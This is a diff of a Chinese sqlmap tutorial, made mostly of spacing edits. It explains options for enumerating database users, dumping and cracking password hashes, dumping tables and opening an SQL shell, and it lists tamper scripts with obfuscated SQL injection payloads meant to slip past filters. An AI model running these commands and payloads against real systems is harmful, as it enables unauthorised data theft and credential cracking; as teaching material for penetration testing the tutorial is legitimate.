+默认情况下`sqlmap`针对`UNION`查询的注入会使用 NULL 字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，
 
-这是你可以用`–union-char`只定UNION查询的字符。
+这是你可以用`–union-char`只定 UNION 查询的字符。
 
-**二阶SQL注入**
+**二阶 SQL 注入**
 
 参数：`–second-order`
 
 有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。
 
-`–second-order`后面跟一个判断页面的URL地址。
+`–second-order`后面跟一个判断页面的 URL 地址。
 
 **列数据**
 
 参数：`-b,–banner`
 
-大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。
+大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是 version()或者变量@@version 这主要取决与是什么数据库。
 
 **用户**
 
@@ -868,7 +866,7 @@ T: Time-based blind SQL injection（基于时间延迟注入）
 
 参数：`–is-dba`
 
-判断当前的用户是否为管理，是的话会返回True。
+判断当前的用户是否为管理，是的话会返回 True。
 
 **列数据库管理用户**
 
@@ -876,11 +874,11 @@ T: Time-based blind SQL injection（基于时间延迟注入）
 
 当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。
 
-**列出并破解数据库用户的hash**
+**列出并破解数据库用户的 hash**
 
 参数：`–passwords`
 
-当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。
+当前用户有权限读取包含用户密码的彪的权限时，sqlmap 会现列举出用户，然后列出 hash，并尝试破解。
 
 ```
 $ python sqlmap.py -u "http://********/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1
@@ -904,25 +902,25 @@ password hash: md599e5ea7a6f7c3269995cba3927fd0093
 clear-text password: testpass
 ```
 
-可以看到sqlmap不仅勒出数据库的用户跟密码，同时也识别出是PostgreSQL数据库，并询问用户是否采用字典爆破的方式进行破解，
+可以看到 sqlmap 不仅勒出数据库的用户跟密码，同时也识别出是 PostgreSQL 数据库，并询问用户是否采用字典爆破的方式进行破解，
 
 这个爆破已经支持`Oracle`和`Microsoft SQL Server`。
 
-也可以提供-U参数来指定爆破哪个用户的`hash`。
+也可以提供-U 参数来指定爆破哪个用户的`hash`。
 
 **列出数据库管理员权限**
 
 参数：`–privileges`
 
-当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。
+当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap 将会告诉你哪个是数据库的超级管理员。
 
-也可以用-U参数指定你想看哪个用户的权限。
+也可以用-U 参数指定你想看哪个用户的权限。
 
 **列出数据库管理员角色**
 
 参数：`–roles`
 
-当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。
+当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U 参数指定你想看哪个用户的角色。
 
 仅适用于当前数据库是`Oracle`的时候。
 
@@ -943,11 +941,11 @@ sqlmap -u "http://192.168.163.138/mutillidae/index.php?page=user-info.php&userna
 --tables -D dvwa
 ```
 
-如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。
+如果你不提供-D 参数来列指定的一个数据的时候，sqlmap 会列出数据库所有库的所有表。
 
-–exclude-sysdbs参数是指包含了所有的系统数据库。
+–exclude-sysdbs 参数是指包含了所有的系统数据库。
 
-需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。
+需要注意的是在 Oracle 中你需要提供的是 TABLESPACE_NAME 而不是数据库名称。
 
 **列举数据库表中的字段**
 
@@ -955,7 +953,7 @@ sqlmap -u "http://192.168.163.138/mutillidae/index.php?page=user-info.php&userna
 
 当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。
 
-如果没有使用-D参数指定数据库时，默认会使用当前数据库。
+如果没有使用-D 参数指定数据库时，默认会使用当前数据库。
 
 ```
 $ python sqlmap.py -u "http://*******/sqlmap/sqlite/get_int.php?id=1" --columns -D testdb -T users -C name
@@ -980,7 +978,7 @@ Table: users
 
 加上`–exclude-sysdbs`参数，将不会获取数据库自带的系统库内容。
 
-MySQL例子：
+MySQL 例子：
 
 ```
 $ python sqlmap.py -u "http://*******/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
@@ -1062,7 +1060,7 @@ Database: testdb
 
 如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。
 
-使用`-D,-T`参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。
+使用`-D,-T`参数指定想要获取哪个库的哪个表，不使用-D 参数时，默认使用当前库。
 
 列举一个`Firebird`的例子：
 
@@ -1082,13 +1080,13 @@ Table: USERS
 +----+--------+------------+
 ```
 
-可以获取指定库中的所有表的内容，只用`-dump`跟`-D`参数（不使用-T与-C参数）。
+可以获取指定库中的所有表的内容，只用`-dump`跟`-D`参数（不使用-T 与-C 参数）。
 
-也可以用-dump跟-C获取指定的字段内容。
+也可以用-dump 跟-C 获取指定的字段内容。
 
-sqlmap为每个表生成了一个CSV文件。
+sqlmap 为每个表生成了一个 CSV 文件。
 
-如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可hi使用–stop
+如果你只想获取一段数据，可以使用–start 和–stop 参数，例如，你只想获取第一段数据可 hi 使用–stop
 
 1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。
 
@@ -1123,13 +1121,13 @@ sqlmap为每个表生成了一个CSV文件。
 -D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。
 ```
 
-**运行自定义的SQL语句**
+**运行自定义的 SQL 语句**
 
 参数：`–sql-query,–sql-shell`
 
-`sqlmap`会自动检测确定使用哪种SQL注入技术，如何插入检索语句。
+`sqlmap`会自动检测确定使用哪种 SQL 注入技术，如何插入检索语句。
 
-如果是`SELECT`查询语句，`sqlap`将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。
+如果是`SELECT`查询语句，`sqlap`将会输出结果。如果是通过 SQL 注入执行其他语句，需要测试是否支持多语句执行 SQL 语句。
 
 列举一个`Mircrosoft SQL Server 2000`的例子：
 
@@ -1180,7 +1178,7 @@ SELECT 'foo', 'bar': 'foo, bar'
 
 暴力破解的表在`txt/common-tables.txt`文件中，你可以自己添加。
 
-列举一个MySQL 4.1的例子：
+列举一个 MySQL 4.1 的例子：
 
 ```
 $ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner
@@ -1231,7 +1229,7 @@ Database: testdb
 '1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227'
 ```
 
-原理是–n是注释，后面内容不生效，%0A为换行符，这样就可以不使用空格分隔了。
+原理是–n 是注释，后面内容不生效，%0A 为换行符，这样就可以不使用空格分隔了。
 
 在以下版本做过测试:
 
@@ -1265,21 +1263,21 @@ MySQL 4.0, 5.0
 
 示例：
 
-```
-1 AND 9227=9227 
+````
+1 AND 9227=9227
 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227
-​``` 
-版本要求: 
+​```
+版本要求:
 * MySQL >= 5.1.13 Tested
-针对此做过测试: 
+针对此做过测试:
 * MySQL 5.1.41
 #### space2mssqlblank.py
 作用：空格替换为其它空符号
 示例：
 ​```sql
-SELECT id FROM users 
+SELECT id FROM users
 SELECT%08id%02FROM%0Fusers
-```
+````
 
 版本要求:
 
@@ -1297,7 +1295,7 @@ Microsoft SQL Server 2005
 示例：
 
 ```
-SELECT id FROM users 
+SELECT id FROM users
 SELECT%0Bid%0BFROM%A0users
 ```
 
@@ -1353,7 +1351,7 @@ MySQL 5.0
 示例：
 
 ```
-SELECT id FROM users 
+SELECT id FROM users
 SELECT//id//FROM/**/users
 ```
 
@@ -1435,7 +1433,7 @@ All
 
 **12:sp_password.py**
 
-作用：追加`sp_password’`从DBMS日志的自动模糊处理的有效载荷的末尾
+作用：追加`sp_password’`从 DBMS 日志的自动模糊处理的有效载荷的末尾
 
 示例：
 
@@ -1525,7 +1523,7 @@ MySQL 5.0 and 5.5
 
 **3:multiplespaces.py**
 
-作用：围绕SQL关键字添加多个空格
+作用：围绕 SQL 关键字添加多个空格
 
 示例：
 
@@ -1545,7 +1543,7 @@ All
 示例：
 
 ```
-value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa 
+value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’='QDWa
 value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’='QDWa
 ```
 
@@ -1559,7 +1557,7 @@ MySQL 4.0.18, 5.0.22
 
 **5:unionalltounion.py**
 
-作用：替换UNION ALL SELECT UNION SELECT
+作用：替换 UNION ALL SELECT UNION SELECT
 
 示例：
 
@@ -1572,7 +1570,7 @@ MySQL 4.0.18, 5.0.22
 
 **6:randomcomments.py**
 
-作用：用/**/分割sql关键字
+作用：用/\*\*/分割 sql 关键字
 
 ```
 ‘INSERT’
@@ -1586,7 +1584,7 @@ MySQL 4.0.18, 5.0.22
 示例：
 
 ```
-1’ AND 1=1 
+1’ AND 1=1
  1%bf%27 AND 1=1–%20
 8:randomcase.py
 ```
@@ -1620,7 +1618,7 @@ SELECT * FROM users WHERE id LIKE 1
 
 **2:greatest.py**
 
-作用：绕过过滤’>’ ,用GREATEST替换大于号。
+作用：绕过过滤’>’ ,用 GREATEST 替换大于号。
 
 示例：
 
@@ -1639,7 +1637,7 @@ PostgreSQL 8.3, 8.4, 9.0
 
 **3:between.py**
 
-作用：用between替换大于号（>）
+作用：用 between 替换大于号（>）
 
 示例：
 
@@ -1665,7 +1663,7 @@ PostgreSQL 8.3, 8.4, 9.0
 示例：
 
 ```
-1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
+1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#
 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#
 ```
 
@@ -1715,7 +1713,7 @@ PostgreSQL 9.0.3
 
 **4:charencode.py**
 
-作用：url编码
+作用：url 编码
 
 示例：
 
@@ -1750,12 +1748,12 @@ Microsoft Access
 
 **6:chardoubleencode.py**
 
-作用: 双url编码(不处理以编码的)
+作用: 双 url 编码(不处理以编码的)
 
 示例：
 
 ```
-SELECT FIELD FROM%20TABLE 
+SELECT FIELD FROM%20TABLE
 %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545
 ```
 
@@ -1776,7 +1774,7 @@ all
 
 **8:nonrecursivereplacement.py**
 
-作用：双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters
+作用：双重查询语句。取代 predefined SQL 关键字 with 表示 suitable for 替代（例如 .replace（“SELECT”、””)） filters
 
 示例：
 
@@ -1791,11 +1789,8 @@ all
 all
 ```
 
-
-
 参考资料：
 
-sqlmap用户手册中文版：https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html
+sqlmap 用户手册中文版：https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html
 
-sqlmap用户手册：http://drops.xmd5.com/static/drops/tips-143.html
-
+sqlmap 用户手册：http://drops.xmd5.com/static/drops/tips-143.html
